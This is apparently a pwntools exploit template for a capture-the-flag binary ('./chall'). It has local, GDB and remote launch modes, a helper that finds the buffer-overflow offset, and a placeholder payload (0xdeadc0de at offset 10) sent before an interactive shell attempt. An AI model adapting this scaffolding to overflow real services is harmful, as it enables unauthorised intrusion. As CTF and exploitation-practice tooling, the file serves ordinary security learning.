from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
s = lambda x: io.send(x)
rcall = lambda x: io.recvall(x)
rcud = lambda x: io.recvuntil(x, drop=True)
rcu = lambda x: io.recvuntil(x)
rcl = lambda: io.recvline(0)
rcn = lambda x: io.recv(x)
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 10

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [
        p64(0xdeadc0de)
    ]
})

# Send the payload Here
# io.sendlineafter(b'>', payload)
s(payload)
s("\n")

# Got Shell?
io.interactive()
